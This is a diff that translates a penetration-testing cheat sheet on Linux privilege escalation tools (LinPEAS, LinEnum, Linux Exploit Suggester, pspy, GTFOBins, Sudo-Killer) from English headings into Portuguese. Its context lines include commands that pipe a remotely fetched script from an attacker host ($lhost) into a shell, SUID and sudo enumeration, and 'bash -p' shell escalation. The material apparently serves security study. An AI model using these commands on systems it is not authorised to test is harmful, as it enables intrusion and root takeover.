@@ -1,6 +1,6 @@
-# Linux Privilege Escalation Tools
+# Ferramentas de Escalação de Privilégios Linux
 
-## Table of Contents
+## Índice
 
 - [LinPEAS](#linpeas)
 - [LinEnum](#linenum)
@@ -13,16 +13,16 @@
 
 ## LinPEAS
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```bash
-# Quick privesc enumeration
+# Enumeração rápida de privesc
 curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
 > <https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS>
 
-LinPEAS é um script de enumeração de escalonamento de privilégios para sistemas Linux/Unix/MacOS.
+LinPEAS é um script de enumeração de escalação de privilégios para sistemas Linux/Unix/MacOS.
 
 ### Download
 
@@ -32,7 +32,7 @@ curl http://$lhost/linpeas.sh -o linpeas.sh
 chmod +x linpeas.sh
 ```
 
-### Basic Usage
+### Uso Básico
 
 > Executar todas as verificações
 
@@ -52,7 +52,7 @@ chmod +x linpeas.sh
 ./linpeas.sh -b
 ```
 
-### Specific Checks
+### Verificações Específicas
 
 > Apenas processos e cronjobs
 
@@ -72,7 +72,7 @@ chmod +x linpeas.sh
 ./linpeas.sh -f
 ```
 
-### Output Options
+### Opções de Saída
 
 > Salvar saída em arquivo
 
@@ -86,7 +86,7 @@ chmod +x linpeas.sh
 curl -sL http://$lhost/linpeas.sh | bash
 ```
 
-### Examples
+### Exemplos
 
 > Enumerar tudo e salvar
 
@@ -106,9 +106,9 @@ curl -sL http://$lhost/linpeas.sh | bash
 
 > <https://github.com/rebootuser/LinEnum>
 
-LinEnum é um script de enumeração de escalonamento de privilégios focado em simplicidade.
+LinEnum é um script de enumeração de escalação de privilégios focado em simplicidade.
 
-### LinEnum Basic Usage
+### Uso Básico do LinEnum
 
 > Executar enumeração básica
 
@@ -122,7 +122,7 @@ LinEnum é um script de enumeração de escalonamento de privilégios focado em 
 ./LinEnum.sh -t -r report -e /tmp/
 ```
 
-### Common Checks
+### Verificações Comuns
 
 > Verificações de sudo
 
@@ -142,7 +142,7 @@ LinEnum é um script de enumeração de escalonamento de privilégios focado em 
 ./LinEnum.sh | grep -i cron
 ```
 
-### Output Options
+### Opções de Saída
 
 > Relatório detalhado
 
@@ -162,9 +162,9 @@ LinEnum é um script de enumeração de escalonamento de privilégios focado em 
 
 > <https://github.com/The-Z-Labs/linux-exploit-suggester>
 
-Ferramenta para encontrar vulnerabilidades de escalonamento de privilégios via kernel desatualizado.
+Ferramenta para encontrar vulnerabilidades de escalação de privilégios via kernel desatualizado.
 
-### LES Usage
+### Uso do LES
 
 ```bash
 # Executar verificações do kernel
@@ -177,7 +177,7 @@ Ferramenta para encontrar vulnerabilidades de escalonamento de privilégios via 
 ./linux-exploit-suggester.sh --full
 ```
 
-### Specific Options
+### Opções Específicas
 
 ```bash
 # Verificação rápida
@@ -187,7 +187,7 @@ Ferramenta para encontrar vulnerabilidades de escalonamento de privilégios via 
 ./linux-exploit-suggester.sh --checksec
 ```
 
-### Output Example
+### Exemplo de Saída
 
 ```text
 [+] [CVE-2021-4034] PwnKit
@@ -209,7 +209,7 @@ Ferramenta para encontrar vulnerabilidades de escalonamento de privilégios via 
 
 Pspy monitora processos sem precisar de privilégios de root — útil para capturar cronjobs e scripts executados por root.
 
-### Pspy Basic Usage
+### Uso Básico do Pspy
 
 > Monitorar processos e sistema de arquivos
 
@@ -223,7 +223,7 @@ Pspy monitora processos sem precisar de privilégios de root — útil para capt
 ./pspy32
 ```
 
-### Options
+### Opções
 
 ```bash
 # Monitorar apenas processos (sem FS)
@@ -239,7 +239,7 @@ Pspy monitora processos sem precisar de privilégios de root — útil para capt
 ./pspy64 -v
 ```
 
-### Common Workflow
+### Fluxo de Trabalho Comum
 
 ```bash
 # Executar e aguardar cronjobs (observar por alguns minutos)
@@ -249,7 +249,7 @@ Pspy monitora processos sem precisar de privilégios de root — útil para capt
 ./pspy64 | grep "UID=0"
 ```
 
-### Output Example
+### Exemplo de Saída
 
 ```text
 2024/01/01 12:00:01 CMD: UID=0    PID=1234  | /bin/sh -c /opt/scripts/backup.sh
@@ -264,7 +264,7 @@ Pspy monitora processos sem precisar de privilégios de root — útil para capt
 
 GTFOBins é uma lista de binários Unix que podem ser usados para contornar restrições de segurança locais.
 
-### GTFOBins Usage
+### Uso do GTFOBins
 
 > Verificar binários SUID
 
@@ -278,7 +278,7 @@ find / -perm -u=s -type f 2>/dev/null
 sudo -l
 ```
 
-### Common Binaries
+### Binários Comuns
 
 > Shell via sudo
 
@@ -321,7 +321,7 @@ bash -p
 
 Sudo-Killer identifica misconfigurations e vulnerabilidades no sudo.
 
-### Sudo-Killer Usage
+### Uso do Sudo-Killer
 
 ```bash
 # Executar verificações completas
@@ -334,7 +334,7 @@ Sudo-Killer identifica misconfigurations e vulnerabilidades no sudo.
 ./sudo_killer.sh -e /tmp/exploits/
 ```
 
-### Checks Performed
+### Verificações Realizadas
 
 ```bash
 # Verificar versão do sudo vulnerável
@@ -350,9 +350,9 @@ env
 
 ---
 
-## Quick Reference
+## Referência Rápida
 
-### Tool Selection
+### Seleção de Ferramenta
 
 | Tarefa | Ferramenta |
 | :--- | :--- |
@@ -361,9 +361,9 @@ env
 | Kernel exploits | Linux Exploit Suggester |
 | Monitorar processos root | Pspy |
 | Abusar binários sudo/SUID | GTFOBins |
-| Misconfigurações sudo | Sudo-Killer |
+| Misconfigurations sudo | Sudo-Killer |
 
-### Common Workflow
+### Fluxo de Trabalho Comum
 
 ```bash
 # 1. Enumeração inicial
@@ -382,7 +382,7 @@ find / -perm -u=s -type f 2>/dev/null
 # 5. Consultar GTFOBins para binários encontrados
 ```
 
-### File Locations
+### Locais para Transferência de Arquivos
 
 ```bash
 # Locais para transferir ferramentas
@@ -394,16 +394,15 @@ $HOME/
 
 ---
 
-## 📚 See Also
+## Veja Também
 
-### Related Privilege Escalation
+### Escalação de Privilégios Relacionada
 
-- **[Privilege Escalation Linux](Privilege-Escalation-Linux.md)** - Metodologia completa de privesc no Linux
+- **[Escalação de Privilégios Linux](Privilege-Escalation-Linux.md)** - Metodologia completa de privesc no Linux
 - **[GTFOBins Linux](GTFOBins-Linux.md)** - Abuso de binários nativos do Linux
-- **[Linux PrivEsc Tools](Linux-PrivEsc-Tools.md)** - Este arquivo
 
-### Related Topics
+### Tópicos Relacionados
 
-- **[Linux Command](../6.OS-Command/6.2.Linux-command.md)** - Comandos de enumeração Linux
-- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - Ataques de credenciais após enumeração
-- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Movimentação pós-exploração
+- **[Comandos Linux](../OS-Command/Linux-command.md)** - Comandos de enumeração Linux
+- **[Ataques de Senha](../AD-Exploit/Password-Attacks.md)** - Ataques de credenciais após enumeração
+- **[Movimento Lateral](../Lateral-Movement/Lateral-Movement.md)** - Movimentação pós-exploração
